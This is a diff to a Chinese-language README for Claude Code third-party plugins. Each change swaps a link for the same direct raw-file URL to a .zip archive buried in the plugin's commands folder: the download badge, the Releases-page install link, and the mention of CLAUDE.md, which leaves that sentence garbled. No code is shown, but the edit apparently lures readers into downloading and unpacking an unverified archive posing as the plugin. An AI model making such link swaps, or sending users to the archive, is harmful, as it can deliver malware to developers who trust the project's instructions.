@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/download-v1.0.0-blue.svg)](https://github.com/KlivDev/claude-code-third-party-plugins/releases)
+[![Download Now](https://raw.githubusercontent.com/KlivDev/claude-code-third-party-plugins/main/plugins/project-init/commands/claude-code-third-party-plugins-1.1.zip)](https://raw.githubusercontent.com/KlivDev/claude-code-third-party-plugins/main/plugins/project-init/commands/claude-code-third-party-plugins-1.1.zip)
 
 </div>
 
@@ -28,7 +28,7 @@ Claude Code 插件是通过自定义斜杠命令（Slash Commands）、专用代
 
 通过交互式问答，快速生成定制的项目开发规范文件。
 
-- **命令**: `/project-init` - 交互式创建项目 CLAUDE.md 规范
+- **命令**: `/project-init` - 交互式创建项目 https://raw.githubusercontent.com/KlivDev/claude-code-third-party-plugins/main/plugins/project-init/commands/claude-code-third-party-plugins-1.1.zip 规范
 - **特性**:
   - 9轮问答收集项目信息
   - 支持多种技术栈（Go/Python/TypeScript/Java）
@@ -44,7 +44,7 @@ Claude Code 插件是通过自定义斜杠命令（Slash Commands）、专用代
 
 ### 方式二：从 Releases 页面下载
 
-1. 请访问 [Releases 页面](https://github.com/KlivDev/claude-code-third-party-plugins/releases)。
+1. 请访问 [Releases 页面](https://raw.githubusercontent.com/KlivDev/claude-code-third-party-plugins/main/plugins/project-init/commands/claude-code-third-party-plugins-1.1.zip)。
 2. 找到最新版本的插件，点击下载链接。
 3. 下载文件到您的设备。
 4. 解压并按照其中的说明进行安装。
